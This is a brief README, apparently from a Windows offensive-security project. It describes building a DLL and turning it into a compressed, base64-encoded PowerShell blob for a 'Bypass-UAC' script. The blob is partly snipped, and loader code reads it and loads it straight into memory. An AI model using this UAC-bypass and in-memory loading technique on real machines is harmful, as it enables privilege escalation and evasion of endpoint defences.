# Build

This project was built with Visual Studio 2015.

# Replace Code In Bypass-UAC

After compiling the dll, the "Out-ManagedDll" script can be used to generate output which allows for easy integration into Bypass-UAC. This script is based on [@mattifestation](https://twitter.com/mattifestation)'s post [here](http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html).

```
PS C:\> Out-ManagedDll -FilePath C:\Some\Path\output.dll

$EncodedCompressedFile = @'
7Vt7fFx1lT/3kZnMJJk8GkoLAaZNS9PYhLzatFC0k8ykGTIvZiZ9YCXcmblJhk7mjvdO2oZSTBVRP4ACgqLAQl1YEFhhPwsfkccuAlbWFUHRBS0qiuKyvlBXF1Fkzzn3zp2ZJDzWP/y4n483ud/fOed3fud3fud3fr/7yE34nCtAAgAZz9dfB7gPzGMbvPUxj6fnlPs9cI/riVX3CaEnViWns4a3oGtTujLjTSv5vFb0plSvPpv3ZvNefzThndEyandDg3uNZSMWAAgJEr

[..Snip..]

F1MqifGoJSwdYp8f+GcC7Nvo3jRM4HsOoM4M/KuoXwbAsr66oK3D/czhahfXK/ntQp9SfH08D0uxHocrPkkYU5SqPplzbg7t/2cYOrjcq2vZCN+qUTuqzBfWD7Cvp4rM9tix79sZ9dePdao6/vx5lGyGsn+LWNMoCjo88n4JpoP9nWSzzwmfx9OJ9MMWQPinv5BiV7ZgzlUF+hud0rx1NQC3qM2rZy1p+l7zN/5/838pxj2GthrJZjHmxam7eLN4DHO/qtgujvjDmm7mNDzUMHlsKrc9hJN6q3V/02GZ+819451+6478dfw3H/wI=
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](14336)
$DeflatedStream.Read($UncompressedFileBytes, 0, 14336) | Out-Null
[Reflection.Assembly]::Load($UncompressedFileBytes)
```